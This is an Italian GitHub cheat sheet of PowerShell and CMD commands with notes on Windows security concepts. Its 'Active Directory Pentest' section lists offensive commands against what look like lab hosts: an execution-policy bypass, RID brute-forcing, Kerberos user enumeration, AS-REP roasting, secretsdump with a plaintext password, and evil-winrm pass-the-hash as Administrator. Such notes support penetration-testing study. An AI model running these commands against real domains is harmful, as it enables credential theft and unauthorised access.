# Lista comandi 
[Comandi per info generali sul pc](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-per-info-generali-sul-pc)
<!-- spazio -->
[Comandi generali](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-generali)
<!-- spazio -->
[Comandi per enumerare le macchine a dominio con powerview](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-per-enumerare-le-macchine-a-dominio-attraverso-powerview)
<!-- spazio -->
[Active Directory Pentest](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#active-directory-pentest)
<!-- spazio -->
[Note](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#note)
<!-- spazio -->
   - [Note sulla sicurezza in Windows](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#note-sulla-sicurezza-in-windows)
<!-- spazio -->
   - [Note generali](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#note-generali)



# Comandi per info generali sul pc 

    Get-ComputerInfo #prendi informazioni della macchina
<!-- spazio -->
    Get-Localuser #listi gli utenti nella macchina
<!-- spazio -->
    Get-ScheduledTask #listi tutti gli schedule task / tasklis
<!-- spazio -->
    Get-Acl #per listare le access-list dei permessi
<!-- spazio -->
    Get-PSDrive  #lista i drive dell'ambiente legati a powershell che possono essere variabili,oggetti,registri e volumi.

# Comandi Generali

    fl #per ricevere più output 
ES: 
Get-Acl | fl

    Get-Help <nome comando > -Full #ottieni l'help dei comandi
 <!-- spazio -->
    Update-Help -Force #per aggiornare gli help alla versione più recente    
 <!-- spazio -->
    Select-Object #utilizzato per prendere un campo dell'oggetto specifico 
ES:
Get-LocalUser John | Select-Object LastLogon output: 03/02/2019 5:48:32 PM

    Get-Command #utilizzato per sapere se un comando o un eseguibile è presente in powershell
<!-- spazio -->
    New-LocalUser  #per creare nuovi utenti locali
ES:
New-LocalUser -Name $User -Password (ConvertTo-SecureString -AsPlainText "123456789" -Force)

    New-LocalGroup #per creare un nuovo gruppo
ES:
New-LocalGroup -Name $Group

    Add-LocalGroupMember #aggiungi un utente ad un gruppo
ES:
Add-LocalGroupMember -Group $Group -Member $User

    reg query #per interrogare i registri
<!-- spazio -->
    New-item #per creare file o cartelle
<!-- spazio -->
    Start-service #per avviare un servizio
ES:
Start-service WinRM

# Comandi per enumerare le macchine a dominio (attraverso PowerView)

Scaricare PowerView.ps1 sulla macchina e avviarlo:

    powershell -ep bypass
    . .\PowerView.ps1
    
dopo aver avviato powerview abbiamo a disposizione dei comandi aggiuntivi per la rete di dominio:
enumerare gli utenti a dominio:

    Get-NetUser #ottiene le informazioni sugli utenti

<!-- spazio -->

    Get-NetUser | select cn #per ottenere solo il common name

<!-- spazio -->

    Get-NetGroup    #ottiene tutti i gruppi presenti a dominio

<!-- spazio -->

    Get-NetGroup -GroupName *admin*    #ottiene tutti i gruppi in cui è presente la parola admin

<!-- spazio -->

    Invoke-ShareFinder    #ottiene tutte le shares smb del dominio

<!-- spazio -->

    Get-NetComputer -FullData    #ottiene tutte le informazioni su tutti i pc della rete

<!-- spazio -->

    Get-NetComputer -FullData | Select-Object logoncount    #per ridurre l'output da parsare selezioniamo l'oggeto specifico come in questo caso per gli accessi    


# Active Directory Pentest

_comandi SMB_
<!-- spazio -->

    smbmap -H <ip> -L #comando per listare e indica i permessi
<!-- spazio -->

    smbclient -L \\\\\<ip>\\ #comando per listare
<!-- spazio -->

    smbclient  \\\\<ip>\\<shares> -U <user> #comando per entrare nello share e poi inserire la password
<!-- spazio -->
_enumerazione del DC_
Comando per enumerare il DC, ci da l'output di: nome dominio, gruppi, utenti e SMB e altro:
<!-- spazio -->

    enum4linux <ip> #enumerazione
    
_enumerazione utenti_
<!-- spazio -->

-crackmapexec, però se abbiamo l'accesso a IPC$ all'interno di SMB:
<!-- spazio -->

    crackmapexec smb VULNNET-RST -u 'guest' -p '' --rid-brute
<!-- spazio -->

-kerbrute, tramite una lista di user possiamo vederee che Users ci sono:
<!-- spazio -->

    kerbrute_linux_amd64 userenum -d <domain_name> --dc <domain_controller_ip> <wordlist>
<!-- spazio -->

_recupero TGT utenti_
<!-- spazio -->

    impacket-GetNPUsers VULNNET-RST/t-skid -no-pass # funziona solamente con utenti che non hanno settata la flag UF_DONT_REQUIRE_PREAUTH
<!-- spazio -->

_recupero credenziali_
<!-- spazio -->

    impacket-secretsdump -dc-ip 10.10.208.78 a-whitehat:bNdKVkjv3RR9ht@10.10.208.78 # recupera NTDS.DIt, SAM hashes
<!-- spazio -->
_connessione remota alla target machine_
<!-- spazio -->

    evil-winrm -i 10.10.113.15 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d #utilizziamo il WinRM protocol per connettersi
<!-- spazio -->
# Note

_Wmi è un sottosistema di powershell, che fornisce informazioni dettagliate sul sistema operativo, l'hardware, il software e altre risorse del computer quindi per il system monitoring, fa da framework comune perchè presente sulle varie versioni di Windows_
_Get-WmiObject #comando per ottenere oggetti fisici o logici gestibili dal WMi, insiemi a lui di solito va specificato la __-Class__ cioè la classe da recuperare._

_MMC(Microsoft managment console) interfaccia gui che permette di aggiungere degli snaps-in(moduli) che estendono le funzionalitè del MMC che ha il compito di monitorare risorse hardware e software._

_Wmi è un sottosistema di powershell, che fornisce informazioni dettagliate sul sistema operativo, l'hardware, il software e altre risorse del computer quindi per il system monitoring, fa da framework comune perchè presente sulle varie versioni di Windows_

_MMC(Microsoft managment console) interfaccia gui che permette di aggiungere degli snaps-in(moduli) che estendono le funzionalitè del MMC che ha il compito di monitorare risorse hardware e software._

_WSL(WIndows subsystem linux) un vero sottosistema che simula l'utilizzo di una shell linux, si installa con questo comando:
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux_

### Note sulla sicurezza in Windows

_SID(Security Identifier) aggiunto a utente,gruppi,domini o a qualsiasi altro entità di sicurezza, viene utilizzato per gestire l'accesso alle risorse_

ES:
_S-1-5-21-674899381-4069889467-2080702030-1002_

_SAM(Security account manager) database interno che contiene le informazioni dei vari utenti come password, hash e nomi utenti, è utilizzato dal LSA(lsass.exe) per l'autenticazione._

_ACL(Access control list) e ACE (Access control entrie) le ACE le troviamo dentro l'ACL, le ACE possono avere diverse regole come: deny o allow e si applicano su risorse e utenti._

_UAC(User Access ControlL) utilizzato per non fare eseguire codice o script malevoli, in quanto richiede i priviliegi di amministratore._

_AppLocker permette un controllo granulare di script e dll, permette di aggiungere delle regole sempre su di loro._

_Local group policy utilizzato per le policy di sicurezza dei gruppi._


### Note Generali

_Psremoting(Powershell remoting) è una funzionalità in powershell che permette di eseguire comandi Powershell da remoto, sfrutta il WinRM (Uguale al RDP ma sicuro), per utilizzarlo va startato il servizio._

__Steps generali per attivare PSremoting__
    - avviare il servizio WinRm sulla machine dove connettersi
    - aggiungere l'IP dove si vuole connettere ai /TrustedHosts
    - startare una PSSession e inserire le credenziali
    - entrare nella sessione con il comando Enter-PSSession 1
